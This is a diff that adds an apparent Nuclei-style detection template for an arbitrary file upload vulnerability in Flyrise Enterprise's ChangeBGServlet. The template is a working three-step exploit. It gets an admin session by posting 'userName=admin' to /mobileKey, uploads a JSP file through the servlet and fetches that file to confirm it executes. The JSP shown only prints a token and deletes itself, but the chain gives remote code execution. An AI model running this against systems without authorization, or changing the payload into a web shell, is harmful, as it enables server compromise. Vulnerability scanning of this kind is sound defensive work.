@@ -1,0 +1,87 @@
+id: poc-yaml-flyrise-enterprise-changebgservlet-anyfile-upload
+info:
+  name: Flyrise Enterprise ChangeBGServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in Flyrise Enterprise's ChangeBGServlet endpoint, allowing potential remote code execution.
+
+variables:
+  t1: '{{rand_text_alphanumeric(7)}}'
+  t2: '{{base64(t1)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: obtain-session
+    method: POST
+    path:
+      - '{{BaseURL}}/mobileKey'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'userName=admin'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'true'
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        regex:
+          - 'SESSION=(.*?);'
+
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/servlet/ChangeBGServlet'
+    headers:
+      Cookie: SESSION={{cookie}};
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+    body: |
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: text/plain
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '.jsp'
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - '/login/applyTheme/images/portal/login/(.*?).jsp'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/login/applyTheme/images/portal/login/{{file}}.jsp'
+    headers:
+      Cookie: SESSION={{cookie}};
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
